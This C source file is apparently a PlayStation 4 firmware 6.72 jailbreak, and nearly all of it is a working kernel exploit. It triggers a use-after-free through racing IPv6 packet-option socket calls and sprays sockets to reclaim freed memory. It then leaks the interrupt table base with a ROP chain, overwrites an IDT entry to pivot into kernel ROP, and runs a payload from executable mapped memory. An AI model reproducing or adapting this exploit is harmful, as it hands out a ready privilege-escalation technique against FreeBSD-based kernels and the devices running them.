//////////////////////////////////////////////////////////////////////
// PS4 (Playstation 4) Jailbreak for Firmware 6.72
// Originally made by Sleirsgoevy
// Modified and Maintained by A0ZHAR
//////////////////////////////////////////////////////////////////////
#include <sys/types.h>            
#include <sys/socket.h>           
#include <sys/param.h>            
#include <sys/cpuset.h>           
#include <netinet/in.h>           
#include <netinet/ip6.h>          
#include <netinet6/ip6_var.h>     
#include <unistd.h>               
#include <time.h>                 
#include <errno.h>                
#include <stddef.h>               
#include <sys/mman.h>             
#include <librop/pthread_create.h>
#include <ps4/errno.h>            

// TODO: Implement some kind of way to allow for remote debugging 
// in the form of sending messages from the ps4 to our pc...
// but atm, this will basically do nothing...
int printf_(const char *fmt, ...) { return 0; }

#define IPV6_2292PKTINFO    19
#define IPV6_2292PKTOPTIONS 25

// ps4-rop-8cc generates thread-unsafe code, so each racing thread 
// needs its own get_tclass function
#define GET_TCLASS(name) int name(int s) {               \
    int v;                                               \
    socklen_t l = sizeof(v);                             \
    if(getsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &v, &l)) \
        *(volatile int*)0;                               \
    return v;                                            \
}

GET_TCLASS(get_tclass)
GET_TCLASS(get_tclass_2)
GET_TCLASS(get_tclass_3)

// TODO: Add comment to this function
int set_tclass(int s, int val) {
    if (setsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &val, sizeof(val)))
        *(volatile int *)0;
    return 0;
}

#define TCLASS_MASTER   0x13370000
#define TCLASS_MASTER_2 0x73310000
#define TCLASS_SPRAY    0x41
#define TCLASS_TAINT    0x42

#define set_pktopts(s, buf, len) setsockopt(s, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, buf, len)
#define set_pktinfo(s, buf)      setsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, buf, sizeof(struct in6_pktinfo))
#define set_rthdr(s, buf, len)   setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, len)
#define free_pktopts(s)          set_pktopts(s, NULL, 0)

// TODO: Add comment to this, and members
struct opaque {
    volatile int triggered;
    volatile int padding;
    volatile int done1;
    volatile int done2;
    int master_sock; // master socket
    int kevent_sock; // kevent socket
    int *spray_sock; // pointer to array of sprayed sock's 
};

// Gets the routing header from socket
int get_rthdr(int s, char *buf, int len) {
    socklen_t l = len;
    if (getsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, &l))
        *(volatile int *)0;
    return l;
}

// Gets the packet information from socket
int get_pktinfo(int s, char *buf) {
    socklen_t l = sizeof(struct in6_pktinfo);
    if (getsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, buf, &l))
        *(volatile int *)0;
    return l;
}

// Creates a new Socket, with it's type set to be Datagram socket
// and returns it's descriptor.
int new_socket() { return socket(AF_INET6, SOCK_DGRAM, 0); }

// TODO: Add comment to this function
void *use_thread(void *arg) {
    struct opaque *o = (struct opaque *)arg;
    // Create a buffer to hold control messages with enough space for an integer
    char buf[CMSG_SPACE(sizeof(int))];
    // Create a control message structure for IPv6 traffic class information.
    // This structure will be used to specify that we are working with the IPv6 protocol
    // and need to manipulate the traffic class (TCLASS) as ancillary data.
    struct cmsghdr *cmsg = (struct cmsghdr *)buf;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int)); // Set the length of the control message to include an integer
    cmsg->cmsg_level = IPPROTO_IPV6;          // Set the protocol level to IPPROTO_IPV6 (IPv6 protocol)
    cmsg->cmsg_type = IPV6_TCLASS;           // Set the control message type to IPV6_TCLASS (IPv6 traffic class type)
    // Given a pointer to the control message header "cmsg," set its data field to 0
    *(int *)CMSG_DATA(cmsg) = 0;
    while (!o->triggered && get_tclass_2(o->master_sock) != TCLASS_SPRAY)
        if (set_pktopts(o->master_sock, buf, sizeof(buf)))
            *(volatile int *)0;

    o->triggered = o->done1 = 1;
}

// TODO: Add comment to this function
void *free_thread(void *arg) {
    struct opaque *o = (struct opaque *)arg;
    while (!o->triggered && get_tclass_3(o->master_sock) != TCLASS_SPRAY) {
        if (free_pktopts(o->master_sock))
            *(volatile int *)0;
        
        nanosleep("\0\0\0\0\0\0\0\0\xa0\x86\1\0\0\0\0\0", NULL); // 100 us
    }
    o->triggered = 1;
    o->done2 = 1;
}

// Triggers a Use-After-Free bug
void trigger_uaf(struct opaque *o) {
     int qqq[256];
    // Initialize the members of the opaque struct to 0
    o->triggered = o->padding = o->done1 = o->done2 = 0;
    
    // Create a new thread to execute the use_thread function using <o> 
    // as the function argument, then the ID of created thread will be
    // stored inside of the <qqq>
    pthread_create(qqq, NULL, use_thread, o);
    
    // Create a new thread to execute the free_thread function using <o> 
    // as the function argument, then the ID of created thread will be
    // stored inside of the <qqq> after the first 128 bytes
    pthread_create(qqq + 128, NULL, free_thread, o);

    // TODO: add comment
    for (;;) {
        for (int i = 0; i < 32; i++)
            set_tclass(o->spray_sock[i], TCLASS_SPRAY);
        if (get_tclass(o->master_sock) == TCLASS_SPRAY)
            break;
        for (int i = 0; i < 32; i++)
            if (free_pktopts(o->spray_sock[i]))
                *(volatile int *)0;
        nanosleep("\0\0\0\0\0\0\0\0\xa0\x86\1\0\0\0\0\0", NULL); // 100 us
    }
    
    printf_("uaf: %d\n", get_tclass(o->master_sock) - TCLASS_SPRAY);
    o->triggered = 1;
    
    while (!o->done1 || !o->done2);
}

// TODO: Add comment to this function
int build_rthdr_msg(char *buf, int size) {
    int len = ((size / 8) - 1) & ~1;
    size = (len + 1) * 8;
    // Create a new Routing Header structure instance in the given buffer.
    struct ip6_rthdr *rthdr = (struct ip6_rthdr *)buf;
    rthdr->ip6r_nxt = 0;   // Set the next header value to 0 (no additional headers follow).
    rthdr->ip6r_len = len; // length in units of 8 octets
    // Set the type used in our routing header to IPV6_RTHDR_TYPE_0. 
    // This allows a variable number of segments, ranging from 0-127.
    rthdr->ip6r_type = IPV6_RTHDR_TYPE_0;
    // Calculate and set the number of segments left in the routing header.
    rthdr->ip6r_segleft = rthdr->ip6r_len / 2;
    return size;
}

#define PKTOPTS_PKTINFO_OFFSET (offsetof(struct ip6_pktopts, ip6po_pktinfo))
#define PKTOPTS_RTHDR_OFFSET   (offsetof(struct ip6_pktopts, ip6po_rhinfo.ip6po_rhi_rthdr))
#define PKTOPTS_TCLASS_OFFSET  (offsetof(struct ip6_pktopts, ip6po_tclass))

// TODO: Add comment to this function
int fake_pktopts(struct opaque *o, int overlap_sock, int tclass0, unsigned long long pktinfo) {
    free_pktopts(overlap_sock);
    char buf[0x100] = { 0 };
    int l = build_rthdr_msg(buf, 0x100);
    int tclass;
    for (;;) {
        for (int i = 0; i < 32; i++) {
            *(unsigned long long *)(buf + PKTOPTS_PKTINFO_OFFSET) = pktinfo;
            *(unsigned int *)(buf + PKTOPTS_TCLASS_OFFSET) = tclass0 | i;
            if (set_rthdr(o->spray_sock[i], buf, l))
                *(volatile int *)0;
        }
        tclass = get_tclass(o->master_sock);
        if ((tclass & 0xffff0000) == tclass0)
            break;
        for (int i = 0; i < 32; i++)
            if (set_rthdr(o->spray_sock[i], NULL, 0))
                *(volatile int *)0;
    }
    return tclass & 0xffff;
}

unsigned long long __builtin_gadget_addr(const char *);
unsigned long long rop_call_funcptr(void(*)(void *), ...);

// TODO: Add comment to this function
void sidt(unsigned long long *addr, unsigned short *size) {
    char buf[10];
    unsigned long long ropchain[14] = {
        __builtin_gadget_addr("mov rax, [rdi]"),
        __builtin_gadget_addr("pop rsi"),
        ropchain + 13,
        __builtin_gadget_addr("mov [rsi], rax"),
        __builtin_gadget_addr("pop rsi"),
        ~7ull,
        __builtin_gadget_addr("sub rdi, rsi ; mov rdx, rdi"),
        __builtin_gadget_addr("mov rax, [rdi]"),
        __builtin_gadget_addr("pop rcx"),
        0x7d,
        __builtin_gadget_addr("add rax, rcx"),
        __builtin_gadget_addr("sidt [rax - 0x7d]"),
        __builtin_gadget_addr("pop rsp"),
        0
    };
    ((void(*)(char *))ropchain)(buf);
    *size = *(unsigned short *)buf;
    *addr = *(unsigned long long *)(buf + 2);
}

// TODO: Add comments to all of these external variables
void (*enter_krop)(void);
extern uint64_t krop_idt_base;
extern uint64_t krop_jmp_crash;
extern uint64_t krop_ud1;
extern uint64_t krop_ud2;
extern uint64_t krop_read_cr0;
extern uint64_t krop_read_cr0_2;
extern uint64_t krop_write_cr0;
extern uint64_t krop_c3bak1;
extern uint64_t krop_c3bak2;
extern uint64_t krop_kernel_base;
extern uint64_t krop_master_sock;
extern char spray_bin[];
extern char spray_end[];

// TODO: Add comment, and comment members
struct spray_opaque {
    int cpu;
    void *spray_map;
    uint64_t kernel_base;
    int *flag;
};

// TODO: Add comment to this function
void pin_to_cpu(int cpu) {
    cpuset_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_PID, getpid(), sizeof(set), &set);
}

int main() {
    // Check if we can escalate privileges to root (UID 0).
    // If not, return an error code (179).
    if (!setuid(0)) return 179;

    // Spray 16 new sockets 
    for (int i = 0; i < 16; i++)
        new_socket();

    int tmp;
    uint64_t idt_base; // IDT (Interrupt Descriptor Table) base addreess
    uint16_t idt_size; // IDT (Interrupt Descriptor Table) size
    // Retrieve the IDT (Interrupt Descriptor Table) base address and size.
    sidt(&idt_base, &idt_size);
    printf_("sidt = 0x%hx 0x%llx\n", idt_size, idt_base);

    krop_idt_base = idt_base;
    uint64_t kernel_base = idt_base - 0x1bbb9e0;
    krop_kernel_base = kernel_base;
    krop_jmp_crash = kernel_base + 0x1c0;
    krop_read_cr0 = kernel_base + 0xa1b70;
    krop_read_cr0_2 = kernel_base + 0xa1b70;
    krop_write_cr0 = kernel_base + 0xa1b79;

    int kevent_sock = new_socket();
    int master_sock = new_socket();
    krop_master_sock = master_sock * 8;

    int spray_sock[512];
    int socket_count = 0, kqueues_count = 0;
    // Create 512 sockets and update socket_count with their sum.
    for (int i = 0; i < 512; i++) socket_count += (spray_sock[i] = new_socket());

    printf_("sockets=%d kqueues=%d\n", socket_count, kqueues_count);
    struct opaque o;
    o.master_sock = master_sock;
    o.kevent_sock = kevent_sock;
    o.spray_sock = spray_sock;
    trigger_uaf(&o);
    printf_("uaf ok!\n");

    set_tclass(master_sock, TCLASS_TAINT);
    int overlap_idx = -1;
    for (int i = 0; i < 512; i++) {
        if (get_tclass(spray_sock[i]) == TCLASS_TAINT)
            overlap_idx = i;
    }
    printf_("overlap_idx = %d\n", overlap_idx);
    if (overlap_idx < 0) return 1;
    int overlap_sock = spray_sock[overlap_idx];
    int cleanup1 = overlap_sock;
    spray_sock[overlap_idx] = new_socket();
    overlap_idx = fake_pktopts(&o, overlap_sock, TCLASS_MASTER, idt_base + 0xc2c);
    printf_("overlap_idx = %d\n", overlap_idx);
    if (overlap_idx < 0) return 2;
    overlap_sock = spray_sock[overlap_idx];
    int cleanup2 = overlap_sock;
    spray_sock[overlap_idx] = new_socket();

    char buf[20];
    printf_("get_pktinfo() = %d\n", get_pktinfo(master_sock, buf));
    printf_("idt before corruption: ");
    // for (int i = 0; i < 20; i++) printf_("%02x ", (unsigned)(unsigned char)buf[i]);
    char buf2[20];
    // Copy contents of buf (IDT before corruption) over
    // to buf2 (byte-by-byte).
    for (int i = 0; i < 20; i++)
        buf2[i] = buf[i];

    uint64_t entry_gadget = __builtin_gadget_addr("$ pivot_addr");
    krop_c3bak1 = *(uint64_t *)(buf2 + 4);
    krop_c3bak2 = *(uint64_t *)(buf2 + 12);
    *(uint16_t *)(buf2 + 4) = (uint16_t)entry_gadget;
    *(uint64_t *)(buf2 + 10) = entry_gadget >> 16;
    buf2[9] = 0x8e;
    krop_ud1 = *(uint64_t *)(buf2 + 4);
    krop_ud2 = *(uint64_t *)(buf2 + 12);
    buf2[9] = 0xee;
    printf_("idt after corruption:  ");
    // for (int i = 0; i < 20; i++) printf_("%02x ", (unsigned)(unsigned char)buf2[i]);
    printf_("set_pktinfo() = %d\n", set_pktinfo(master_sock, buf2));
    enter_krop();// Execute kernel ROP.

    char *spray_start = spray_bin;
    char *spray_stop = spray_end;
    size_t spray_size = spray_stop - spray_start;
    // Allocate memory s store and execute the contents of spray_bin[] array.
    char *spray_map = mmap(0, spray_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANON, -1, 0);
    printf_("spray_map = 0x%llx\n", spray_map);
    // Copy the contents of the spray_bin[] array byte-by-byte to the mapped memory.
    for (size_t i = 0; i < spray_size; i++)
        spray_map[i] = spray_start[i];

    // run malloc sprays to reclaim any potential double frees
    pin_to_cpu(6);
    rop_call_funcptr(spray_map, spray_sock, kernel_base);
    pin_to_cpu(7);
    rop_call_funcptr(spray_map, NULL, kernel_base);
    return 9;
}
